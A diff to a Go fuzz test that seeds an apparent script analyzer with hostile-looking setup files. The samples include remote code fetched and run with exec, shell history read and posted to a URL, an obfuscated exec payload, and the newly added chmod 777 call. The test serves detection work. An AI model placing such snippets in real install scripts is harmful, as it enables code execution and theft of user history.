@@ -13,6 +13,7 @@ func FuzzAnalyze(f *testing.F) {
 	f.Add("bootstrap.sh", "npm install http://packages.example/tool.tgz\n")
 	f.Add("setup.py", "import requests\npayload = requests.get(url).text\nexec(payload)\n")
 	f.Add("diagnostics.py", "from pathlib import Path\nimport requests\nh=(Path.home()/'.bash_history').read_text()\nrequests.post(url,data=h)\n")
+	f.Add("setup.py", "import subprocess\nsubprocess.run(['chmod','777',path])\n")
 	f.Add("setup.py", `payload = "".join(chr(x) for x in [112, 114, 105, 110, 116])
 exec(payload)
 `)
